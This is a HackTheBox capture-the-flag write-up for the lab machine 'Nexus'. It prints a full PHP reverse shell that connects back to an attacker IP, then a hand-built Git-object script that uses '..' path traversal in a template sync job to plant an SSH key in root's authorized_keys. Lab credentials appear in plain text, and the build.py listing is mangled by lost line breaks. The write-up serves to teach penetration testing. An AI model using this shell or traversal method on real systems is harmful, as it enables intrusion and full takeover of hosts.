---
layout: writeup
title: "Nexus"
date: 2026-08-11
platform: HackTheBox
description: "`Nexus` is an easy-difficulty Linux machine that features an exposed Gitea repository leaking credentials and a job posting that reveals valid usernames. The leaked credentials provide access to `Krayin CRM`, which is vulnerable to `CVE-2026-38526`, leading to a shell as `www-data`. Further enumeration of the `Krayin CRM` configuration files reveals additional credentials that allow `SSH` access. Service enumeration reveals a `Gitea` template sync service vulnerable to directory traversal, which is leveraged to gain a shell as `root`."
image: /assets/Nexus/nexuslogo.png
---

On today's hacking, we are working on a machine labeled as easy on HacktheBox called Nexus. It's a very interesting machine that made me have some headaches on the privesc section. Let's see.

We start with the current meta for CTF's which is the enumeration phase with nmap:


```bash
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $sudo nmap -p- --min-rate=500 -Pn -n -sS 10.129.43.109 -oN ports1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 09:20 CEST
Nmap scan report for 10.129.43.109
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds

```

We can see that we have port 22 and port 80 open. Let's run another nmap command using the -sCV function to run internal scripts from nmap in order to get better information from it

```bash
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $sudo nmap -p22,80 -sCV 10.129.43.109 -oN ports2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 09:21 CEST
Nmap scan report for 10.129.43.109
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
```



After adding the domain to our /etc/hosts file we can enter the webpage and see what offer to us the port 80


![Nexus](/assets/Nexus/nexushtbdomain.png)

Seems like a webpage to invest in more reliable sources of energy. There is no relevant panel there, not a single button that leads to a different page to login, or check opinions or anything, but at the end of the web there is a button to apply for a position and there is an email specified there

``j.matthew@nexus.htb``


![Nexus](/assets/Nexus/mail.png)

Taking notes about that, we might need this email in following steps.

Used Wappalyzer to check the web technologies but didn't had any luck on that, couldn't find anything relevant

![Nexus](/assets/Nexus/wappalyzer.png)

```bash 
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $whatweb http://nexus.htb
http://nexus.htb [200 OK] Country[RESERVED][ZZ], Email[careers@nexus.htb,j.matthew@nexus.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.43.109], Script, Title[Nexus Energy Authority — Powering the Nation's Future], nginx[1.24.0]
```

Nothing interesting at the moment.
As the page is not offering any other movement to do, I wanted to check if with some directory fuzzing could take any other info. Tried with Feroxbuster:

```bash
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $sudo feroxbuster -u http://nexus.htb
                                                                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nexus.htb/
 🚩  In-Scope Url          │ nexus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1267l     3775w    49296c http://nexus.htb/
[####################] - 23s    30000/30000   0s      found:1       errors:2      
[####################] - 22s    30000/30000   1364/s  http://nexus.htb/
```

Nothing. It's true that feroxbuster works better when you know the technology behind the web, for example if it's using PHP you could add it to your command and it would retreive way more information, but IDK, I got some good results in the past just using feroxbuster like that. Not in this case seems like.

Moved to ffuf tool:
```bash
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $sudo ffuf -u http://nexus.htb -H "HOST: FUZZ.nexus.htb" -w /usr/share/wordlists/dirb/small.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nexus.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/small.txt
 :: Header           : Host: FUZZ.nexus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

CYBERDOCS25             [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 35ms]
W3SVC2                  [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 35ms]
200                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
Pages                   [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
CVS                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
0                       [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
Servlets                [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 35ms]
Logs                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
2003                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
Administration          [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
CYBERDOCS               [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
Statistics              [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 35ms]
SiteServer              [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 36ms]
<SNIP>
<SNIP>
~admin                  [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 38ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 2337ms]
:: Progress: [959/959] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```


Here we got something, if you pay attention to the last line -->

``billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 2337ms]``

I added the subdomain to my /etc/hosts file and went straight to it to see what it has to offer


![Nexus](/assets/Nexus/krayinlogin.png)

We got the email, but not the password. Tried with burpsuite checking the "Forget Password" function to see if I can do anything on that. No luck.
Also did a small research to check if there is any current CVE that allows unauthenticated users to access on Krayin, but all the ones I saw require a previous login.

I spent some time stuck here until I restarted the process of enumeration with a bigger directory research with ffuf. In the previous command I used a small dictionary, now i'm using the big one.



```bash
┌─[tch4vi@parrot]─[~/Documents/Nexus]
└──╼ $sudo ffuf -u http://nexus.htb -H "HOST: FUZZ.nexus.htb" -w /usr/share/wordlists/dirb/big.txt > ffuf.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nexus.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.nexus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [20469/20469] :: Job [1/1] :: 1136 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

I exported it into a file because the idea of checking the results given just by the input was kinda dumb.

![Nexus](/assets/Nexus/enumeration.png)

![Nexus](/assets/Nexus/enumeration2.png)

With this deeper directory fuzzing I found another subdomain called "git"

![Nexus](/assets/Nexus/giteadomain.png)

Maybe here we can find the password I need for the Krayin platform.


![Nexus](/assets/Nexus/gitecrawling4.png)

It's identical to github. I explored the files that are in the repository and there is quite good hints

![Nexus](/assets/Nexus/giteacrawling.png)


![Nexus](/assets/Nexus/giteacrawling2.png)

The ${DB_PASSWORD}, made me think maybe, there are commits that allow me to see previous versions of the repository where sensitive data might be in plain text:

![Nexus](/assets/Nexus/giteacrawling3.png)

bingo! We got the password ``N27xh!!2ucY04``
I went to the Krayin platform, and logged in with the following credentials:

Email: j.matthew@nexus.htb
Password: N27xh!!2ucY04


![Nexus](/assets/Nexus/krayindashboard.png)

I've did a small investigation in order to find any possible vulnerability on Krayin platform. Found this -->
https://github.com/cybercrewinc/CVE-2026-36340

Seems like there is a remote code execution vulnerability on the platform that allows any authenticated user to upload malicious PHP files. So that's what we did.
Thanks to our usual payloads dealer, pentestmonkey, we created a malicious php file to get a reverse shell. We just need to change the IP and port in the script -->
https://pentestmonkey.net/tools/web-shells/php-reverse-shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.21';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

With that file created compose a mail and attach it.

![Nexus](/assets/Nexus/maliciousmail2.png)

Before uploading our malicious file, we start burping with burp-suite. Thanks to the CVE-2026-36340, we know that we can identify the path where the file is being stored inside the victim machine

![Nexus](/assets/Nexus/burpnexus.png)

Here we go

![Nexus](/assets/Nexus/burpnexus2.png)

Now we access it while we have our attacker machine listening to the port we specified, in my case, port 4444

![Nexus](/assets/Nexus/billingdomain.png)


![Nexus](/assets/Nexus/nclisten.png)

Bingo!

Moving arround the config files we find the .env file that contains the database credentials. We got the username Krayin and it's password.

![Nexus](/assets/Nexus/dbpass.png)

We know it's the database user, but it's worth the try trying to change to that user.

```bash
www-data@nexus:~/krayin$ su krayin
su krayin
su: user krayin does not exist or the user entry does not contain all the required fields
```

```bash
www-data@nexus:~/krayin$ cat /etc/passwd | grep krayin
cat /etc/passwd | grep krayin
www-data@nexus:~/krayin$ 
```

But the user doesn't exist.
In the /home directory we found that there are 2 folders, one for user ``git`` and another for user ``jones``.
Let's try to re-use the credentials from the database with the user jones. On the contrary as krayin user, we checked in the /etc/passwd file that jones user exists

```bash
www-data@nexus:~/krayin$ su jones
su jones
Password: y27xb3ha!!74GbR
```


```bash
jones@nexus:/home$ cd jones
cd jones
jones@nexus:~$ ls
ls
user.txt
jones@nexus:~$ cat user.txt
cat user.txt
e877a8ed1525623ab10be1af1d8d893d
jones@nexus:~$ 
```

It's worth a try always re-using the credentials from other users. Cybersecurity is something that most users doesn't take very seriously, so, even though it's a CTF machine, I would say it's pretty accurate to the reality when it comes to duplicated passwords for different users.


Now it's time for the privesc.


```bash
jones@nexus:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```


```bash
jones@nexus:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
```

Imma be honest with you, I had to check the official writeup to complete it. This privesc method has some deep concepts that i'm not very familiarized at the moment so, it was time for me to grab a coffe, open the writeup, read, replicate, and try to understand.

Something when investigating a machine to complete the privesc phase, it's enumerate the automatized scripts/jobs running internally on the victim machine.

```bash
jones@nexus:/tmp$ systemctl list-timers
WARNING: terminal is not fully functional
Press RETURN to continue 
NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES                       
Fri 2026-07-31 18:17:44 UTC      57s Fri 2026-07-31 18:16:44 UTC       2s ago gitea-template-sync.timer      gitea-template-sync.service
Fri 2026-07-31 18:20:00 UTC 3min 12s Fri 2026-07-31 18:10:02 UTC     6min ago sysstat-collect.timer          sysstat-collect.service
Fri 2026-07-31 18:21:44 UTC 4min 56s Mon 2026-05-11 16:31:53 UTC            - fwupd-refresh.timer            fwupd-refresh.service
Fri 2026-07-31 18:23:00 UTC     6min Thu 2026-04-23 18:33:27 UTC            - man-db.timer                   man-db.service
Fri 2026-07-31 18:39:00 UTC    22min Fri 2026-07-31 18:09:02 UTC     7min ago phpsessionclean.timer          phpsessionclean.service
Fri 2026-07-31 18:40:26 UTC    23min Tue 2026-05-12 11:52:41 UTC            - motd-news.timer                motd-news.service
Sat 2026-08-01 00:00:00 UTC 5h 43min Fri 2026-07-31 17:23:31 UTC    53min ago dpkg-db-backup.timer           dpkg-db-backup.service
Sat 2026-08-01 00:00:00 UTC 5h 43min Fri 2026-07-31 17:23:31 UTC    53min ago logrotate.timer                logrotate.service
Sat 2026-08-01 00:07:00 UTC 5h 50min -                                      - sysstat-summary.timer          sysstat-summary.service
Sat 2026-08-01 02:33:55 UTC       8h Fri 2026-07-31 17:49:58 UTC    26min ago apt-daily.timer                apt-daily.service
Sat 2026-08-01 06:18:04 UTC      12h Fri 2026-07-31 18:15:24 UTC 1min 22s ago apt-daily-upgrade.timer        apt-daily-upgrade.service
Sat 2026-08-01 09:02:12 UTC      14h Mon 2026-03-23 10:50:29 UTC            - update-notifier-motd.timer     update-notifier-motd.service
Sat 2026-08-01 17:28:28 UTC      23h Fri 2026-07-31 17:28:28 UTC    48min ago update-notifier-download.timer update-notifier-download.service
Sat 2026-08-01 17:38:27 UTC      23h Fri 2026-07-31 17:38:27 UTC    38min ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sun 2026-08-02 03:10:27 UTC 1 day 8h Fri 2026-07-31 17:24:08 UTC    52min ago e2scrub_all.timer              e2scrub_all.service
Mon 2026-08-03 01:08:14 UTC   2 days Fri 2026-07-31 17:50:24 UTC    26min ago fstrim.timer                   fstrim.service

16 timers listed.
```

Here, the most importat one is the "gitea-template-sync.timer" that rolls almost every minute. I checked the python script that is involved in and found that there are some key vulnerabilities on it:

```python
jones@nexus:/etc/gitea$ cat template-sync.py 
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
jones@nexus:/etc/gitea$ 
```

This is the full script, and the important thing is this:

```python
target = os.path.join(stage_path, filepath)
```

To understand better what it does.. This script looks for repositories marked as templates in Gitea and copies all the files to ``/home/git/template-staging/<owner>/<repo>/`` 

Imagine the repository called "rce" has the following files:
``README.md``
``config.txt``
``hello.php``

The program does
```python
stage_path = "/home/git/template-staging/jones/rce"

filepath = "README.md"

target = os.path.join(stage_path, filepath)
```

Result:

``/home/git/template-staging/jones/rce/README.md``

The problem here is that ``filepath`` is controlled by the attacker. The program did:

``target = os.path.join(stage_path, filepath)``

But it's not checking if ``filepath`` is really a file inside ``stage_path``
So if ``filepath`` was:

``../../../file.txt``

Python would build a path that is outside the expected directory.
The paths that come from the git ls-tree are being used without sanitization and ``os.path.join()`` allows the components ``..`` to escape the staging directory.

But here it comes the main problem that makes this machine, Nexus, not so easy. After discovering this big flaw, you might be thinking something like:

``Okey i'm gonna create a file called ../../../../root/.ssh/authorized_keys in Git``

You cannot do it like this, Git has his own ways to validate the paths, that's why the walkthrough uses the script called ``build.py``. The script is not only creating the sus file through ``git add``, it's building manually the Git objects internally.
Git doesn't justs saves the content of the files... Has objects, the importants ones are:

``blob ---> content from a file``
``tree ---> structure/directory``
``commit ---> points a tree``

In summary it would be something like:
```
COMMIT ---> TREE ---> README.md ---> BLOB
				 |
				 └──--> .ssh/ ---> TREE ---> authorized_keys ---> BLOB
```


All of this might sound so off the table, but it's important to understand all of this to abuse this privesc. Let's move on.

So we went to the git.nexus.htb and logged in as jones with the password we already know. There are no repositories created.
We created one repository with the name "rce" and checking the option "template - Make repository a template"


![Nexus](/assets/Nexus/repoempty.png)

![Nexus](/assets/Nexus/repotemplate.png)


We plan to upload our ssh-key abusing this vulnerability so, in our atacking machine we create a ssh-key in /tmp/.k and we git clone the repository.

Our plan:
```bash
/home/git/template-staging/jones/rce/ 
				+ 
../../../../../root/.ssh/authorized_keys 
               │ 
			   ▼ 
  /root/.ssh/authorized_keys
```


``git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git``


```bash
─[✗]─[tch4vi@parrot]─[/tmp/rce]
└──╼ $ssh-keygen -t ed25519 -f /tmp/.k -N ''
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/.k
Your public key has been saved in /tmp/.k.pub
The key fingerprint is:
SHA256:if0CYQLDlfD3EfhqJA8Tr1zvulZ8ejOGVs1OvzEnmyc tch4vi@parrot
The key`s randomart image is:
+--[ED25519 256]--+
| .+o.. ..        |
|  .+o .  .       |
|    oo+..        |
|    +++=.o       |
|   . Oo+S  o     |
|    o +.+.o +    |
|     . o.=.o .+ .|
|      . =.= . EB.|
|     .o+ o o  ++ |
+----[SHA256]-----+
```

We then, with the help of the writeup, we create a python script as follows:
```python
# build.py 
#!/usr/bin/env python3 
import hashlib,zlib,os,subprocess,sys,time 
def write_obj(data,t): 
	h=("%s %d"%(t,len(data))).encode()+b"\x00" 
	s=h+data sha=hashlib.sha1(s).hexdigest()
	d=os.path.join(".git","objects",sha[:2]) os.makedirs(d,exist_ok=True)
	p=os.path.join(d,sha[2:])
	if not os.path.exists(p):
		open(p,"wb").write(zlib.compress(s))
	return sha 
def entry(mode,name,sha):
	return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha) 
	
	if not os.path.isdir(".git"):
		print("Run inside git repo");sys.exit(1)
	r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
	if r.returncode!=0:
		print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1) key=r.stdout.strip()+"\n" blob=write_obj(key.encode(),"blob") readme=write_obj(b"# Template\n","blob") ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree") cur=write_obj(entry("40000",".ssh",ssh_t),"tree") fir=write_obj(entry("40000","root",cur),"tree")
		for i in range(4): fir=write_obj(entry("40000","..",fir),"tree") root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree") ts=int(time.time()) c="tree %s\nauthor x %d +0000\ncommitter x %d +0000\n\ninit\n"%(root,ts,ts) sha=write_obj(c.encode(),"commit") os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True) open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n") print("Done: "+sha)
```


Remember what we said before about the ``blob`` the ``tree`` and the ``commit`` ? This script buils precisely these objects manually. The writeup shows that ``write_obj()`` calculates the SAH-1 of the Git object and writes it directly in ``.git/objects/`` instead of asking Git to validate and create the structure for us

Heres the special thing about the script, the script builds a structure that Git, conceptually, understands as:

```
. 
└── .. 
	 └── .. 
		  └── .. 
			   └── .. 
				    └── .. 
						 └── root 
							   └── .ssh 
									 └── authorized_keys

```

The writeup specifies that the ``trees`` with ``.`` and ``..`` entries are being created.

The ``blob`` the ``tree`` and the ``commit``... I will not forget it.

Moving on, we execute the script that will upload our authorized key on the root directory

```bash
┌─[tch4vi@parrot]─[/tmp/rce]
└──╼ $python3 /tmp/build.py
Done: bf9ad7fd143e4d05df151013c9d4ddfef29a0063
```

```bash
┌─[tch4vi@parrot]─[/tmp/rce]
└──╼ $git push -u origin main --force
advertencia: no es posible acceder '../../../../../root/.gitattributes': Permiso denegado
advertencia: no es posible acceder '../../../../../root/.ssh/.gitattributes': Permiso denegado
Enumerando objetos: 11, listo.
Contando objetos: 100% (11/11), listo.
Compresión delta usando hasta 12 hilos
Comprimiendo objetos: 100% (3/3), listo.
Escribiendo objetos: 100% (11/11), 613 bytes | 613.00 KiB/s, listo.
Total 11 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://git.nexus.htb/jones/rce.git
 * [new branch]      main -> main
rama 'main' configurada para rastrear 'origin/main'.
```

After pushing, we need to wait for the template sync timer to start.

![Nexus](/assets/Nexus/catsync.png)

After that, we can try to ssh with root, as we uploaded our ssh-key.

```bash
┌─[tch4vi@parrot]─[/tmp/rce]
└──╼ $ssh -i /tmp/.k root@nexus.htb
```

```bash
root@nexus:~# cat root.txt
d117cea4d5677bc6e6e385360058d82a
```


![Nexus](/assets/Nexus/nexuspwned.png)

